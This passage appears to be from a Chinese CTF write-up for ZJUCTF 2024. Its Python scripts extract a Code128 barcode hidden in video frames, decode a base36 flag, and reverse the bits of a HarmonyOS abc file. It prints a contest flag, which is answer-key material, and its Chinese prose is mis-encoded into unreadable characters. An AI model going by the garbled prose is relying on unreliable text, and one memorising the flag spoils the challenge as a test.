å¯†ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰base36åŠ å¯†å¯¹åº”çš„è¡¨ï¼Œå¶ç„¶é—´ç»“åˆè§†é¢‘é¢˜ç›®ä»£å·128ï¼ŒçŒœæµ‹æ˜¯è§†é¢‘ä¸­è¿˜éšè—äº†C128æ¡å½¢ç ï¼Œæ˜¯base36åŠ å¯†å¯¹åº”çš„è¡¨ã€‚ä½†æ˜¯éŸ³é¢‘å·²ç»æ­ç§˜è¿‡äº†ï¼Œäºæ˜¯çŒœæµ‹æ¡å½¢ç éšè—åœ¨å›¾ç‰‡å¸§ä¸­ï¼Œå†™è„šæœ¬æ¯”å¯¹æ¯ä¸€å¸§ä¸ç¬¬ä¸€å¸§å›¾ç‰‡çš„æ¯ä¸ªåƒç´ ï¼Œæœç„¶å‘ç°äº†çŒ«è…»(æ¯”å¯¹ä»£ç æ˜¯GPTç”Ÿæˆçš„ï¼Œæ‡’å¾—å†™qwq): <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># è®¾ç½®è¾“å…¥è§†é¢‘è·¯å¾„å’Œè¾“å‡ºå›¾ç‰‡ä¿å­˜è·¯å¾„</span><br>video_path = <span class="hljs-string">&#x27;128.mp4&#x27;</span><br>output_dir = <span class="hljs-string">&#x27;frames&#x27;</span><br><br><span class="hljs-comment"># å¦‚æœè¾“å‡ºæ–‡ä»¶å¤¹ä¸å­˜åœ¨ï¼Œåˆ›å»ºå®ƒ</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(output_dir):<br>    os.makedirs(output_dir)<br><br><span class="hljs-comment"># æ‰“å¼€è§†é¢‘æ–‡ä»¶</span><br>cap = cv2.VideoCapture(video_path)<br><br><span class="hljs-comment"># è¯»å–è§†é¢‘çš„ç¬¬ä¸€å¸§ä½œä¸ºåŸºå‡†å¸§</span><br>ret, first_frame = cap.read()<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ret:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ— æ³•è¯»å–è§†é¢‘æ–‡ä»¶&quot;</span>)<br>    cap.release()<br>    exit()<br><br><span class="hljs-comment"># å°†ç¬¬ä¸€å¸§ä¿å­˜ä¸ºå›¾ç‰‡</span><br>first_frame_path = os.path.join(output_dir, <span class="hljs-string">&#x27;frame_0.jpg&#x27;</span>)<br>cv2.imwrite(first_frame_path, first_frame)<br><br><span class="hljs-comment"># å°†ç¬¬ä¸€å¸§è½¬æ¢ä¸ºç°åº¦å›¾åƒ</span><br>gray_first_frame = cv2.cvtColor(first_frame, cv2.COLOR_BGR2GRAY)<br><br><span class="hljs-comment"># è®¾ç½®å¸§å·®å¼‚çš„é˜ˆå€¼ï¼Œç”¨æ¥åˆ¤æ–­å¸§ä¹‹é—´çš„å·®å¼‚</span><br>threshold = <span class="hljs-number">0.8</span><br><br><span class="hljs-comment"># åˆå§‹åŒ–å¸§è®¡æ•°å™¨</span><br>frame_counter = <span class="hljs-number">1</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># é€å¸§è¯»å–è§†é¢‘</span><br>    ret, frame = cap.read()<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ret:<br>        <span class="hljs-keyword">break</span>  <span class="hljs-comment"># å¦‚æœæ²¡æœ‰æ›´å¤šçš„å¸§ï¼Œé€€å‡ºå¾ªç¯</span><br>    <br>    <span class="hljs-comment"># å°†å½“å‰å¸§è½¬æ¢ä¸ºç°åº¦å›¾åƒ</span><br>    gray_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)<br>    <br>    <span class="hljs-comment"># è®¡ç®—ä¸ç¬¬ä¸€å¸§çš„å·®å¼‚</span><br>    frame_diff = cv2.absdiff(gray_first_frame, gray_frame)<br>    <br>    <span class="hljs-comment"># è®¡ç®—å¸§å·®å¼‚çš„å¹³å‡å€¼</span><br>    diff_mean = np.mean(frame_diff)<br>    <br>    <span class="hljs-comment"># å¦‚æœå·®å¼‚å¤§äºè®¾å®šçš„é˜ˆå€¼ï¼Œä¿å­˜è¯¥å¸§ä¸ºå›¾ç‰‡</span><br>    <span class="hljs-keyword">if</span> diff_mean &gt; threshold:<br>        frame_filename = <span class="hljs-string">f&#x27;frame_<span class="hljs-subst">&#123;frame_counter&#125;</span>.jpg&#x27;</span><br>        frame_path = os.path.join(output_dir, frame_filename)<br>        cv2.imwrite(frame_path, frame)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ä¿å­˜å¸§: <span class="hljs-subst">&#123;frame_filename&#125;</span>, å·®å¼‚å€¼: <span class="hljs-subst">&#123;diff_mean&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># æ›´æ–°å¸§è®¡æ•°å™¨</span><br>    frame_counter += <span class="hljs-number">1</span><br><br><span class="hljs-comment"># é‡Šæ”¾è§†é¢‘æ•è·å¯¹è±¡</span><br>cap.release()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å¤„ç†å®Œæˆï¼&quot;</span>)<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/31.png"></p></li><li><p>æŸäº›å¸§å­˜å‚¨äº†æ¡å½¢ç å¯¹åº”çš„ä¿¡æ¯ï¼ŒæŒ‰å¸§æ’åºï¼ŒåŒæ—¶å‡ºç°çš„ç™½è‰²ç…§ç‰‡å¼ æ•°å°±æ˜¯è¯¥ä¸ºæ¡å½¢ç çš„ç¼–ç å€¼ï¼Œå†™è„šæœ¬è¯»å–å¹¶è§£æ: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_columns_as_lists</span>(<span class="hljs-params">image_path</span>):<br>    <span class="hljs-keyword">if</span> os.path.exists(image_path):<br>        image = cv2.imread(image_path, cv2.IMREAD_GRAYSCALE)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <br>    width = image.shape[<span class="hljs-number">1</span>]<br>    columns_pixel_values = []<br>    <span class="hljs-keyword">for</span> col_index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        column_pixels = image[:, col_index].tolist()<br>        columns_pixel_values.append(column_pixels[<span class="hljs-number">68</span>:-<span class="hljs-number">68</span>])<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> columns_pixel_values:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>(i)&lt;<span class="hljs-number">10000</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">sum</span>(i)&gt;<span class="hljs-number">27000</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>lis = <span class="hljs-string">&quot;&quot;</span><br>last = <span class="hljs-literal">None</span><br>leng = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">172790</span>):<br>    color = extract_columns_as_lists(<span class="hljs-string">f&quot;./frames/frame_<span class="hljs-subst">&#123;i&#125;</span>.jpg&quot;</span>)<br>    <span class="hljs-keyword">if</span> color != <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> last==<span class="hljs-literal">None</span>:<br>            last = color<br>            leng = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> last==color:<br>            leng+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            lis+=<span class="hljs-built_in">str</span>(leng)<br>            leng = <span class="hljs-number">1</span><br>            last = color<br>lis+=<span class="hljs-built_in">str</span>(leng)<br><span class="hljs-built_in">print</span>(lis,<span class="hljs-built_in">len</span>(lis)//<span class="hljs-number">6</span>)<br>code128b_dict = &#123;<br>    <span class="hljs-string">&#x27;212222&#x27;</span>: <span class="hljs-string">&#x27;SP&#x27;</span>,     <span class="hljs-comment"># ç©ºæ ¼ (Space)</span><br>    <span class="hljs-string">&#x27;222122&#x27;</span>: <span class="hljs-string">&#x27;!&#x27;</span>,      <span class="hljs-comment"># !</span><br>    <span class="hljs-string">&#x27;222221&#x27;</span>: <span class="hljs-string">&#x27;&quot;&#x27;</span>,      <span class="hljs-comment"># &quot;</span><br>    <span class="hljs-string">&#x27;121223&#x27;</span>: <span class="hljs-string">&#x27;#&#x27;</span>,      <span class="hljs-comment"># #</span><br>    <span class="hljs-string">&#x27;121322&#x27;</span>: <span class="hljs-string">&#x27;$&#x27;</span>,      <span class="hljs-comment"># $</span><br>    <span class="hljs-string">&#x27;131222&#x27;</span>: <span class="hljs-string">&#x27;%&#x27;</span>,      <span class="hljs-comment"># %</span><br>    <span class="hljs-string">&#x27;122213&#x27;</span>: <span class="hljs-string">&#x27;&amp;&#x27;</span>,      <span class="hljs-comment"># &amp;</span><br>    <span class="hljs-string">&#x27;122312&#x27;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>,      <span class="hljs-comment"># &#x27;</span><br>    <span class="hljs-string">&#x27;132212&#x27;</span>: <span class="hljs-string">&#x27;(&#x27;</span>,      <span class="hljs-comment"># (</span><br>    <span class="hljs-string">&#x27;221213&#x27;</span>: <span class="hljs-string">&#x27;)&#x27;</span>,      <span class="hljs-comment"># )</span><br>    <span class="hljs-string">&#x27;221312&#x27;</span>: <span class="hljs-string">&#x27;*&#x27;</span>,      <span class="hljs-comment"># *</span><br>    <span class="hljs-string">&#x27;231212&#x27;</span>: <span class="hljs-string">&#x27;+&#x27;</span>,      <span class="hljs-comment"># +</span><br>    <span class="hljs-string">&#x27;112232&#x27;</span>: <span class="hljs-string">&#x27;,&#x27;</span>,      <span class="hljs-comment"># ,</span><br>    <span class="hljs-string">&#x27;122132&#x27;</span>: <span class="hljs-string">&#x27;-&#x27;</span>,      <span class="hljs-comment"># -</span><br>    <span class="hljs-string">&#x27;122231&#x27;</span>: <span class="hljs-string">&#x27;.&#x27;</span>,      <span class="hljs-comment"># .</span><br>    <span class="hljs-string">&#x27;113222&#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span>,      <span class="hljs-comment"># /</span><br>    <span class="hljs-string">&#x27;123122&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,      <span class="hljs-comment"># 0</span><br>    <span class="hljs-string">&#x27;123221&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,      <span class="hljs-comment"># 1</span><br>    <span class="hljs-string">&#x27;223211&#x27;</span>: <span class="hljs-string">&#x27;2&#x27;</span>,      <span class="hljs-comment"># 2</span><br>    <span class="hljs-string">&#x27;221132&#x27;</span>: <span class="hljs-string">&#x27;3&#x27;</span>,      <span class="hljs-comment"># 3</span><br>    <span class="hljs-string">&#x27;221231&#x27;</span>: <span class="hljs-string">&#x27;4&#x27;</span>,      <span class="hljs-comment"># 4</span><br>    <span class="hljs-string">&#x27;213212&#x27;</span>: <span class="hljs-string">&#x27;5&#x27;</span>,      <span class="hljs-comment"># 5</span><br>    <span class="hljs-string">&#x27;223112&#x27;</span>: <span class="hljs-string">&#x27;6&#x27;</span>,      <span class="hljs-comment"># 6</span><br>    <span class="hljs-string">&#x27;312131&#x27;</span>: <span class="hljs-string">&#x27;7&#x27;</span>,      <span class="hljs-comment"># 7</span><br>    <span class="hljs-string">&#x27;311222&#x27;</span>: <span class="hljs-string">&#x27;8&#x27;</span>,      <span class="hljs-comment"># 8</span><br>    <span class="hljs-string">&#x27;321122&#x27;</span>: <span class="hljs-string">&#x27;9&#x27;</span>,      <span class="hljs-comment"># 9</span><br>    <span class="hljs-string">&#x27;321221&#x27;</span>: <span class="hljs-string">&#x27;:&#x27;</span>,      <span class="hljs-comment"># :</span><br>    <span class="hljs-string">&#x27;312212&#x27;</span>: <span class="hljs-string">&#x27;;&#x27;</span>,      <span class="hljs-comment"># ;</span><br>    <span class="hljs-string">&#x27;322112&#x27;</span>: <span class="hljs-string">&#x27;&lt;&#x27;</span>,      <span class="hljs-comment"># &lt;</span><br>    <span class="hljs-string">&#x27;322211&#x27;</span>: <span class="hljs-string">&#x27;=&#x27;</span>,      <span class="hljs-comment"># =</span><br>    <span class="hljs-string">&#x27;212123&#x27;</span>: <span class="hljs-string">&#x27;&gt;&#x27;</span>,      <span class="hljs-comment"># &gt;</span><br>    <span class="hljs-string">&#x27;212321&#x27;</span>: <span class="hljs-string">&#x27;?&#x27;</span>,      <span class="hljs-comment"># ?</span><br>    <span class="hljs-string">&#x27;232121&#x27;</span>: <span class="hljs-string">&#x27;@&#x27;</span>,      <span class="hljs-comment"># @</span><br>    <span class="hljs-string">&#x27;111323&#x27;</span>: <span class="hljs-string">&#x27;A&#x27;</span>,      <span class="hljs-comment"># A</span><br>    <span class="hljs-string">&#x27;131123&#x27;</span>: <span class="hljs-string">&#x27;B&#x27;</span>,      <span class="hljs-comment"># B</span><br>    <span class="hljs-string">&#x27;131321&#x27;</span>: <span class="hljs-string">&#x27;C&#x27;</span>,      <span class="hljs-comment"># C</span><br>    <span class="hljs-string">&#x27;112313&#x27;</span>: <span class="hljs-string">&#x27;D&#x27;</span>,      <span class="hljs-comment"># D</span><br>    <span class="hljs-string">&#x27;132113&#x27;</span>: <span class="hljs-string">&#x27;E&#x27;</span>,      <span class="hljs-comment"># E</span><br>    <span class="hljs-string">&#x27;132311&#x27;</span>: <span class="hljs-string">&#x27;F&#x27;</span>,      <span class="hljs-comment"># F</span><br>    <span class="hljs-string">&#x27;211313&#x27;</span>: <span class="hljs-string">&#x27;G&#x27;</span>,      <span class="hljs-comment"># G</span><br>    <span class="hljs-string">&#x27;231113&#x27;</span>: <span class="hljs-string">&#x27;H&#x27;</span>,      <span class="hljs-comment"># H</span><br>    <span class="hljs-string">&#x27;231311&#x27;</span>: <span class="hljs-string">&#x27;I&#x27;</span>,      <span class="hljs-comment"># I</span><br>    <span class="hljs-string">&#x27;112133&#x27;</span>: <span class="hljs-string">&#x27;J&#x27;</span>,      <span class="hljs-comment"># J</span><br>    <span class="hljs-string">&#x27;112331&#x27;</span>: <span class="hljs-string">&#x27;K&#x27;</span>,      <span class="hljs-comment"># K</span><br>    <span class="hljs-string">&#x27;132131&#x27;</span>: <span class="hljs-string">&#x27;L&#x27;</span>,      <span class="hljs-comment"># L</span><br>    <span class="hljs-string">&#x27;113123&#x27;</span>: <span class="hljs-string">&#x27;M&#x27;</span>,      <span class="hljs-comment"># M</span><br>    <span class="hljs-string">&#x27;113321&#x27;</span>: <span class="hljs-string">&#x27;N&#x27;</span>,      <span class="hljs-comment"># N</span><br>    <span class="hljs-string">&#x27;133121&#x27;</span>: <span class="hljs-string">&#x27;O&#x27;</span>,      <span class="hljs-comment"># O</span><br>    <span class="hljs-string">&#x27;313121&#x27;</span>: <span class="hljs-string">&#x27;P&#x27;</span>,      <span class="hljs-comment"># P</span><br>    <span class="hljs-string">&#x27;211331&#x27;</span>: <span class="hljs-string">&#x27;Q&#x27;</span>,      <span class="hljs-comment"># Q</span><br>    <span class="hljs-string">&#x27;231131&#x27;</span>: <span class="hljs-string">&#x27;R&#x27;</span>,      <span class="hljs-comment"># R</span><br>    <span class="hljs-string">&#x27;213113&#x27;</span>: <span class="hljs-string">&#x27;S&#x27;</span>,      <span class="hljs-comment"># S</span><br>    <span class="hljs-string">&#x27;213311&#x27;</span>: <span class="hljs-string">&#x27;T&#x27;</span>,      <span class="hljs-comment"># T</span><br>    <span class="hljs-string">&#x27;213131&#x27;</span>: <span class="hljs-string">&#x27;U&#x27;</span>,      <span class="hljs-comment"># U</span><br>    <span class="hljs-string">&#x27;311123&#x27;</span>: <span class="hljs-string">&#x27;V&#x27;</span>,      <span class="hljs-comment"># V</span><br>    <span class="hljs-string">&#x27;311321&#x27;</span>: <span class="hljs-string">&#x27;W&#x27;</span>,      <span class="hljs-comment"># W</span><br>    <span class="hljs-string">&#x27;331121&#x27;</span>: <span class="hljs-string">&#x27;X&#x27;</span>,      <span class="hljs-comment"># X</span><br>    <span class="hljs-string">&#x27;312113&#x27;</span>: <span class="hljs-string">&#x27;Y&#x27;</span>,      <span class="hljs-comment"># Y</span><br>    <span class="hljs-string">&#x27;312311&#x27;</span>: <span class="hljs-string">&#x27;Z&#x27;</span>,      <span class="hljs-comment"># Z</span><br>    <span class="hljs-string">&#x27;332111&#x27;</span>: <span class="hljs-string">&#x27;[&#x27;</span>,      <span class="hljs-comment"># [</span><br>    <span class="hljs-string">&#x27;314111&#x27;</span>: <span class="hljs-string">&#x27;\\&#x27;</span>,     <span class="hljs-comment"># \</span><br>    <span class="hljs-string">&#x27;221411&#x27;</span>: <span class="hljs-string">&#x27;]&#x27;</span>,      <span class="hljs-comment"># ]</span><br>    <span class="hljs-string">&#x27;431111&#x27;</span>: <span class="hljs-string">&#x27;^&#x27;</span>,      <span class="hljs-comment"># ^</span><br>    <span class="hljs-string">&#x27;111224&#x27;</span>: <span class="hljs-string">&#x27;_&#x27;</span>,      <span class="hljs-comment"># _</span><br>    <span class="hljs-string">&#x27;111422&#x27;</span>: <span class="hljs-string">&#x27;`&#x27;</span>,      <span class="hljs-comment"># `</span><br>    <span class="hljs-string">&#x27;121124&#x27;</span>: <span class="hljs-string">&#x27;a&#x27;</span>,      <span class="hljs-comment"># a</span><br>    <span class="hljs-string">&#x27;121421&#x27;</span>: <span class="hljs-string">&#x27;b&#x27;</span>,      <span class="hljs-comment"># b</span><br>    <span class="hljs-string">&#x27;141122&#x27;</span>: <span class="hljs-string">&#x27;c&#x27;</span>,      <span class="hljs-comment"># c</span><br>    <span class="hljs-string">&#x27;141221&#x27;</span>: <span class="hljs-string">&#x27;d&#x27;</span>,      <span class="hljs-comment"># d</span><br>    <span class="hljs-string">&#x27;112214&#x27;</span>: <span class="hljs-string">&#x27;e&#x27;</span>,      <span class="hljs-comment"># e</span><br>    <span class="hljs-string">&#x27;112412&#x27;</span>: <span class="hljs-string">&#x27;f&#x27;</span>,      <span class="hljs-comment"># f</span><br>    <span class="hljs-string">&#x27;122114&#x27;</span>: <span class="hljs-string">&#x27;g&#x27;</span>,      <span class="hljs-comment"># g</span><br>    <span class="hljs-string">&#x27;122411&#x27;</span>: <span class="hljs-string">&#x27;h&#x27;</span>,      <span class="hljs-comment"># h</span><br>    <span class="hljs-string">&#x27;142112&#x27;</span>: <span class="hljs-string">&#x27;i&#x27;</span>,      <span class="hljs-comment"># i</span><br>    <span class="hljs-string">&#x27;142211&#x27;</span>: <span class="hljs-string">&#x27;j&#x27;</span>,      <span class="hljs-comment"># j</span><br>    <span class="hljs-string">&#x27;241211&#x27;</span>: <span class="hljs-string">&#x27;k&#x27;</span>,      <span class="hljs-comment"># k</span><br>    <span class="hljs-string">&#x27;221114&#x27;</span>: <span class="hljs-string">&#x27;l&#x27;</span>,      <span class="hljs-comment"># l</span><br>    <span class="hljs-string">&#x27;413111&#x27;</span>: <span class="hljs-string">&#x27;m&#x27;</span>,      <span class="hljs-comment"># m</span><br>    <span class="hljs-string">&#x27;241112&#x27;</span>: <span class="hljs-string">&#x27;n&#x27;</span>,      <span class="hljs-comment"># n</span><br>    <span class="hljs-string">&#x27;134111&#x27;</span>: <span class="hljs-string">&#x27;o&#x27;</span>,      <span class="hljs-comment"># o</span><br>    <span class="hljs-string">&#x27;111242&#x27;</span>: <span class="hljs-string">&#x27;p&#x27;</span>,      <span class="hljs-comment"># p</span><br>    <span class="hljs-string">&#x27;121142&#x27;</span>: <span class="hljs-string">&#x27;q&#x27;</span>,      <span class="hljs-comment"># q</span><br>    <span class="hljs-string">&#x27;121241&#x27;</span>: <span class="hljs-string">&#x27;r&#x27;</span>,      <span class="hljs-comment"># r</span><br>    <span class="hljs-string">&#x27;114212&#x27;</span>: <span class="hljs-string">&#x27;s&#x27;</span>,      <span class="hljs-comment"># s</span><br>    <span class="hljs-string">&#x27;124112&#x27;</span>: <span class="hljs-string">&#x27;t&#x27;</span>,      <span class="hljs-comment"># t</span><br>    <span class="hljs-string">&#x27;124211&#x27;</span>: <span class="hljs-string">&#x27;u&#x27;</span>,      <span class="hljs-comment"># u</span><br>    <span class="hljs-string">&#x27;411212&#x27;</span>: <span class="hljs-string">&#x27;v&#x27;</span>,      <span class="hljs-comment"># v</span><br>    <span class="hljs-string">&#x27;421112&#x27;</span>: <span class="hljs-string">&#x27;w&#x27;</span>,      <span class="hljs-comment"># w</span><br>    <span class="hljs-string">&#x27;421211&#x27;</span>: <span class="hljs-string">&#x27;x&#x27;</span>,      <span class="hljs-comment"># x</span><br>    <span class="hljs-string">&#x27;212141&#x27;</span>: <span class="hljs-string">&#x27;y&#x27;</span>,      <span class="hljs-comment"># y</span><br>    <span class="hljs-string">&#x27;214121&#x27;</span>: <span class="hljs-string">&#x27;z&#x27;</span>,      <span class="hljs-comment"># z</span><br>    <span class="hljs-string">&#x27;412121&#x27;</span>: <span class="hljs-string">&#x27;&#123;&#x27;</span>,      <span class="hljs-comment"># &#123;</span><br>    <span class="hljs-string">&#x27;111143&#x27;</span>: <span class="hljs-string">&#x27;|&#x27;</span>,      <span class="hljs-comment"># |</span><br>    <span class="hljs-string">&#x27;111341&#x27;</span>: <span class="hljs-string">&#x27;&#125;&#x27;</span>,      <span class="hljs-comment"># &#125;</span><br>    <span class="hljs-string">&#x27;131141&#x27;</span>: <span class="hljs-string">&#x27;~&#x27;</span>,      <span class="hljs-comment"># ~</span><br>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(lis),<span class="hljs-number">6</span>):<br>    <span class="hljs-built_in">print</span>(code128b_dict[lis[i:i+<span class="hljs-number">6</span>]],end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/32.png"></p></li><li><p>ç”¨æ¡å½¢ç è§£å‡ºçš„ä¿¡æ¯è§£æbase36ï¼Œå¾—åˆ°flag: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">indexes = <span class="hljs-string">&#x27;ZJUCTF24ABDEGHIKLMNOPQRSVWXY01356789&#x27;</span><br>res = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp:<br>    res = res*<span class="hljs-number">36</span>+indexes.index(i)<br><br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s<br><span class="hljs-built_in">print</span>(n2s(res))<br><br><span class="hljs-comment"># ZJUCTF&#123;A_13G3nd4Ry_4h0uR-T3l36r4Phls7XD&#125;</span><br></code></pre></td></tr></table></figure></p></li></ul><h2 id="cba">CBA</h2><ul><li>æ ¹æ®å‡ºé¢˜äººç»™çš„hintï¼Œ<code>reverse the CBA and you will get an ABC.</code>çŒœæµ‹ä»–ç»™çš„é™„ä»¶æ˜¯ä¸€ä¸ªé¸¿è’™abcæ–‡ä»¶å€’è¿‡æ¥ï¼Œå†™ä¸ªè„šæœ¬å¾—åˆ°æ–‡ä»¶ï¼ˆå¼€å¤´ç¡®å®æ˜¯<code>PANDA</code>æ–‡ä»¶å¤´ï¼‰ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;cba&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>new = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.abc&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.read()[::-<span class="hljs-number">1</span>]:<br>    tmp = <span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)<br>    tmp = <span class="hljs-built_in">int</span>(tmp[::-<span class="hljs-number">1</span>],<span class="hljs-number">2</span>)<br>    new.write(<span class="hljs-built_in">bytes</span>([tmp]))<br></code></pre></td></tr></table></figure></li><li>ç”¨å·¥å…·é€†å‘abcæ–‡ä»¶ï¼Œå‘ç°mainå®šä¹‰äº†ä¸€å †å­—ç¬¦ä¸²ï¼Œæ¯ä¸ªå­—ç¬¦ä¸²å€’è¿‡æ¥å°±æ˜¯appçš„ä¸€äº›å‡½æ•°ï¼Œæ ¹æ®å˜é‡åç¼–å·è¿èµ·æ¥ï¼Œå‘ç°æ˜¯ä¸€ä¸²ç»˜å›¾çš„ä»£ç ï¼š <img src="/img/zjuctf2024/41.png"> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 